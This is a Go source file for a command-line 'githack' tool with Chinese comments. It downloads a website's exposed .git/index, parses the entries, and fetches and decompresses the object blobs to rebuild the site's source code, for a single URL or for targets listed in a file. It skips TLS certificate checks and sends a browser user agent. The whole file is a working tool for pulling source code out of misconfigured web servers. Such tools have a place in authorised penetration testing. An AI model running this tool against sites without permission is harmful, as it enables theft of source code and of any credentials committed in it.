package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"encoding/hex"
	"encoding/binary"
	"path/filepath"
	"errors"
	"io"
	"flag"
	"bufio"
	"sync"
	"bytes"
	"net/url"
	"compress/zlib"
	"crypto/tls"
	"regexp"
)


// 全局变量
var (
	userAgent = "Mozilla/5.0"
	target 		string
	filePath    string
	down        bool
	all         bool
	excludeExt  string
	includeExt  string
	excludeName string
	includeName string
	saveOutput  bool
)

func init() {
	flag.StringVar(&target, "u", "", "批量扫描并保存的文件路径")
	flag.StringVar(&filePath, "uf", "", "批量扫描并保存的文件路径")
	// flag.BoolVar(&down, "down", false, "爬取.git目录，并下载完整的.git泄露的文件")
	// flag.BoolVar(&all, "all", false, "不仅爬取.git，还会再使用lijiejie的githack的方式进行解析下载一遍，并且还会默认带上-o的功能")
	flag.StringVar(&excludeExt, "e", "", "不保存指定后缀的文件")
	flag.StringVar(&includeExt, "i", "", "只保存指定后缀的文件")
	flag.StringVar(&excludeName, "en", "", "不保存名字中带某字符串的文件")
	flag.StringVar(&includeName, "n", "", "只保存名字中带指定字符串的文件")
	flag.BoolVar(&saveOutput, "o", false, "是否保存解析出的所有文件的文件路径")
}


// Entry 定义了每个条目的结构
type Entry struct {
	Entry                  int     `json:"entry"`
	Ctime                  float64 `json:"ctime,omitempty"`
	Mtime                  float64 `json:"mtime,omitempty"`
	Dev                    uint32  `json:"dev"`
	Ino                    uint32  `json:"ino"`
	Mode                   string  `json:"mode"`       // 改为 string 类型
	Uid                    uint32  `json:"uid"`
	Gid                    uint32  `json:"gid"`
	Size                   uint32  `json:"size"`
	Sha1                   string  `json:"sha1"`
	Flags                  uint32  `json:"flags"`
	AssumeValid           bool    `json:"assume-valid"`
	Extended              bool    `json:"extended"`
	Stage                 []bool  `json:"stage"`
	Name                  string  `json:"name"`
}

type GitFile struct {
	Name string
	Sha1 string
}

func parseIndex(filename string, pretty bool) ([]Entry, error) {
	// Open the file
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	// Create a buffer to store the entire file content
	buf := new(bytes.Buffer)
	_, err = io.Copy(buf, file)
	if err != nil {
		return nil, err
	}

	read := func(format string, offset *int64) uint32 {
		var result uint32
		switch format {
		case "I":
			result = binary.BigEndian.Uint32(buf.Bytes()[*offset : *offset+4])
			*offset += 4
		case "H":
			result = uint32(binary.BigEndian.Uint16(buf.Bytes()[*offset : *offset+2]))
			*offset += 2
		}
		return result
	}

	index := make(map[string]interface{})
	offset := int64(0)

	// Read the signature (4 bytes)
	if string(buf.Bytes()[offset:offset+4]) != "DIRC" {
		return nil, errors.New("Not a Git index file")
	}
	offset += 4
	index["signature"] = "DIRC"

	// Read the version (4 bytes)
	index["version"] = read("I", &offset)
	if index["version"].(uint32) != 2 && index["version"].(uint32) != 3 {
		return nil, fmt.Errorf("Unsupported version: %d", index["version"].(uint32))
	}

	// Read the number of entries (4 bytes)
	index["entries"] = read("I", &offset)

	// Now, we continue parsing the entries
	var entries []Entry
	for n := 0; n < int(index["entries"].(uint32)); n++ {
		entry := Entry{
			Entry: n + 1,
		}

		// Read times
		CtimeSeconds := read("I", &offset)
		CtimeNanoseconds := read("I", &offset)
		if pretty {
			ctime := float64(CtimeSeconds) + (float64(CtimeNanoseconds) / 1000000000)
			entry.Ctime = ctime
		}

		MtimeSeconds := read("I", &offset)
		MtimeNanoseconds := read("I", &offset)
		if pretty {
			mtime := float64(MtimeSeconds) + float64(MtimeNanoseconds)/1e9
			entry.Mtime = mtime
		}

		// Read other data
		entry.Dev = read("I", &offset)
		entry.Ino = read("I", &offset)
		entry.Mode = fmt.Sprintf("%06o", read("I", &offset)) // 格式化为字符串
		entry.Uid = read("I", &offset)
		entry.Gid = read("I", &offset)
		entry.Size = read("I", &offset)
		// Read SHA1 (20 bytes)
		entry.Sha1 = hex.EncodeToString(buf.Bytes()[offset : offset+20])
		offset += 20

		// Read flags (2 bytes)
		entry.Flags = read("H", &offset)
		flags := entry.Flags
		entry.AssumeValid = flags&(0b10000000<<8) != 0
		entry.Extended = flags&(0b01000000<<8) != 0
		stageOne := flags&(0b00100000<<8) != 0
		stageTwo := flags&(0b00010000<<8) != 0
		entry.Stage = []bool{stageOne, stageTwo}

		// Handle the name length
		namelen := flags & 0xFFF
		if namelen < 0xFFF {
			if int(namelen) > len(buf.Bytes()[offset:]) {
				return nil, errors.New("name length exceeds remaining file size")
			}
			entry.Name = string(buf.Bytes()[offset : offset+int64(namelen)])
			offset += int64(namelen)
		} else {
			// Handle name in the hard way (long name)
			var nameBytes []byte
			for {
				if buf.Bytes()[offset] == 0x00 {
					break
				}
				nameBytes = append(nameBytes, buf.Bytes()[offset])
				offset++
			}
			entry.Name = string(nameBytes)
		}

		// Handle padding
		entrylen := 62 + int(namelen)
		padlen := (8 - (entrylen % 8)) % 8
		if padlen == 0 {
			padlen = 8
		}
		offset += int64(padlen)

		// Add the entry to the list of entries
		entries = append(entries, entry)
	}

	return entries, nil
}
// isValidName 检查 entryName 是否有效
func isValidName(entryName string, domain, destDir string) bool {
	// 检查是否包含 ".." 或以 / 或 \\ 开头
	if strings.Contains(entryName, "..") || 
		strings.HasPrefix(entryName, "/") || 
		strings.HasPrefix(entryName, "\\") {

		fmt.Printf("[ERROR] Invalid entry name: %s\n", entryName)
		return false
	}

	// 检查是否在目标目录内
	absPath, err := filepath.Abs(filepath.Join(domain, entryName))
	if err != nil {
		fmt.Printf("[ERROR] Unable to get absolute path for %s: %v\n", entryName, err)
		return false
	}

	// 检查绝对路径是否以目标目录路径开头
	if !strings.HasPrefix(absPath, destDir) {
		fmt.Printf("[ERROR] Invalid entry name: %s\n", entryName)
		return false
	}

	return true
}

func getGitIndex(url string) error {
	if !strings.HasSuffix(url, "/") {
		url += "/"
	}
	url += "index"

	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("failed to get URL: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("received non-200 response code: %d", resp.StatusCode)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response body: %v", err)
	}

	err = ioutil.WriteFile("index", body, 0644)
	if err != nil {
		return fmt.Errorf("failed to write to file: %v", err)
	}

	fmt.Println("File 'index' downloaded successfully.")
	return nil
}

// requestData 发送 HTTP 请求并返回响应数据
func requestData(url string) ([]byte, error) {
	// 创建自定义 Transport，跳过 SSL 验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	// 创建请求
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("User-Agent", userAgent)

	// 发送请求
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status_code don`t is 200")
	}
	// 读取响应数据
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	return data, nil
}

// getBackFile 获取文件并保存到本地
func getBackFile(baseURL, sha1, fileName, domain string) error {
	for i := 0; i < 3; i++ {
		// 构造文件夹路径
		folder := fmt.Sprintf("/objects/%s/", sha1[:2])
		url := baseURL + folder + sha1[2:]

		// 获取数据
		data, err := requestData(url)
		if err != nil {
			return fmt.Errorf("failed to request data: %v", err)
		}

		// 解压缩数据
		reader, err := zlib.NewReader(bytes.NewReader(data))
		if err != nil {
			continue
		}
		defer reader.Close()

		decompressedData, err := io.ReadAll(reader)
		if err != nil {
			continue
		}

		// 移除 'blob <number>\x00' 模式
		pattern := regexp.MustCompile(`blob \d+\x00`)
		decompressedData = pattern.ReplaceAll(decompressedData, []byte{})

		// 构造目标目录路径
		targetDir := filepath.Join(domain, filepath.Dir(fileName))
		if targetDir != "" {
			if err := os.MkdirAll(targetDir, os.ModePerm); err != nil {
				return fmt.Errorf("failed to create target directory: %v", err)
			}
		}

		// 写入文件
		filePath := filepath.Join(domain, fileName)
		if err := os.WriteFile(filePath, decompressedData, 0644); err != nil {
			return fmt.Errorf("failed to write file: %v", err)
		}

		fmt.Printf("[OK] %s\n", fileName)
		return nil
	}

	return fmt.Errorf("[Error] Fail to decompress %s", fileName)
}

func gitHack(targets []string,excludeExt string,includeExt string,excludeName string,includeName string,saveOutput bool){
	for _, target := range targets {
		domain:=""
		err := getGitIndex(target)
		if err != nil {
			fmt.Println("Error downloading page:", err)
			return
		}
		parsedURL, err := url.Parse(target)
		if err != nil {
			fmt.Println("Error:", err)
		}
		
		if parsedURL.Port() !=""{
			domain = parsedURL.Hostname()+"_"+parsedURL.Port()
		}else{
			domain = parsedURL.Hostname()
		}
		
		// 检查目录是否存在
		_, err = os.Stat(domain)
		if os.IsNotExist(err) {
			// 如果目录不存在，创建它
			err := os.Mkdir(domain, 0755) // 使用适当的权限
			if err != nil {
				fmt.Println("Error creating directory: ", err)
			}
			fmt.Println("Directory created:", domain)
		} 

		// 获取绝对路径（注意 Windows 路径中反斜杠会被自动转换）
		destDir, err := filepath.Abs(domain)
		if err != nil {
			fmt.Println("Error getting absolute path: ", err)
		}

		entries, err := parseIndex("index", true)
		if err != nil {
			fmt.Println("Error:", err)
			return
		} 
		
		var gitFiles []GitFile

		for _, entry := range entries {
			if entry.Sha1 != "" {
				entryName := strings.TrimSpace(entry.Name)
				
				if excludeExt!=""{
					if strings.HasSuffix(entryName, excludeExt) {
						continue
					}
				}
				if excludeName!=""{
					if strings.Contains(entryName, excludeName) {
						continue
					}
				}
				if includeName!=""{
					if !strings.Contains(entryName, includeName) {
						continue
					}
					
				}
				if includeExt!=""{
					if !strings.HasSuffix(entryName, includeExt) {
						continue
					}
					
				}
				if saveOutput {
					savefilepath := filepath.Join(domain, "gitAllUrl.txt")
					// 以追加模式打开文件（如果文件不存在则创建）
					savefile, err := os.OpenFile(savefilepath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
					if err != nil {
						fmt.Println("无法打开文件:", err)
						return
					}
					defer savefile.Close() // 确保文件关闭
					// 追加写入一行内容
					write := bufio.NewWriter(savefile)
					for i := 0; i < 5; i++ {
						write.WriteString(strings.TrimSpace(entry.Name)+"\n")
					}
					// _, err = fmt.Fprintln(file, )
					// if err != nil {
					// 	fmt.Println("写入文件失败:", err)
					// 	return
					// }
					write.Flush()
				}
				entrySha1 := strings.TrimSpace(entry.Sha1)
				if isValidName(entryName,domain,destDir) {
					gitFiles = append(gitFiles, GitFile{Name: entryName, Sha1: entrySha1})
				}
			}
		}


		for _, file := range gitFiles {
			fmt.Printf("File Name: %s, SHA1: %s\n", file.Name, file.Sha1)
			
		}

		var wg sync.WaitGroup

		limit := make(chan struct{}, 10)
		for _, file := range gitFiles {
			wg.Add(1) 
			limit <- struct{}{} 
			go func() {
				defer wg.Done() 
				defer func() { <-limit }() 

				if err := getBackFile(target, file.Sha1, file.Name, domain); err != nil {
					fmt.Printf("%v\n", err)
				}
			}()
		}
		wg.Wait()
	}
}
func parseTargetsFile(filename string) []string {
	var targets  []string
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("open target file error")
		return targets
	}
	defer file.Close()
	// 使用 bufio.Scanner 逐行读取文件内容
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.TrimSpace(line) == "" {
			continue
		}
		targets = append(targets, line)
	}
	return targets
}
func main() {
	flag.Parse()
	// 1. 下载网页并保存到文件
	if target=="" && filePath==""{
		flag.PrintDefaults() // 输出帮助信息
	}
	var targets []string
	if filePath!=""{
		targets=parseTargetsFile(filePath)
	}
	if target!=""{
		targets = append(targets, target)
	}
	if down==false {
		gitHack(targets,excludeExt,includeExt,excludeName,includeName,saveOutput)
	}
}
